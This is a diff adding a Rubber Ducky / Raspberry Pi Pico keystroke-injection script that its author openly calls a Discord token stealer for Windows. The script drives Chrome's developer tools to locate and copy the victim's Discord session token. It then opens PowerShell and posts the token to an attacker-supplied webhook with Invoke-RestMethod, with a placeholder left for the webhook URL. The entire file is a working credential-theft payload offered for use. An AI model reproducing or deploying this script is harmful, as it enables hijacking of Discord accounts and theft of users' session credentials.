@@ -1,0 +1,111 @@
+REM Author: null3000
+REM PI Pico/ Ducky  discord token stealer via chrome for Windows 10 (And probably 11, though I haven't tried it)
+REM sends token via discord webhook
+Delay 1000
+REM ----------- opens discord on chrome
+GUI r
+DELAY 500
+STRING chrome
+DELAY 400
+ENTER
+DELAY 600
+STRING discord.com
+DELAY 100
+ENTER
+DELAY 500
+REM -------------------- opens developer navigates to token
+CONTROL SHIFT j
+DELAY 1000
+CONTROL RIGHT_BRACKET
+DELAY 100
+CONTROL RIGHT_BRACKET
+DELAY 100
+CONTROL RIGHT_BRACKET 
+DELAY 100
+CONTROL RIGHT_BRACKET
+DELAY 100
+CONTROL RIGHT_BRACKET
+REM ----  centers cursor
+DELAY 100
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+DOWN
+DELAY 50
+DOWN
+DELAY 50
+DOWN
+DELAY 50
+RIGHT
+DELAY 50
+RIGHT
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 150
+STRING token
+DELAY 250
+CONTROL SHIFT m
+DELAY 300
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+DOWN
+DELAY 50
+DOWN
+DELAY 50
+ENTER
+DELAY 100
+TAB
+DELAY 50
+ENTER
+DELAY 500
+CONTROL c
+DELAY 100
+CONTROL SHIFT m
+DELAY 100
+ALT F4
+DELAY 150
+REM ----------------------- SEND THE TOKEN VIA WEBHOOK
+REM ------------------------- MAKE SURE TO PUT YOUR WEBHOOK URL IN!
+GUI r
+DELAY 50
+STRING powershell
+DELAY 50
+ENTER
+DELAY 100
+STRING $hookUrl = "WEBHOOK URL GOES HERE"
+ENTER
+STRING $content = @"
+ENTER
+CONTROL v
+ENTER
+STRING "@
+ENTER
+STRING $payload = [PSCustomObject]@{ content = $content }
+ENTER
+STRING Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
+ENTER
+DELAY 250
+ALT F4
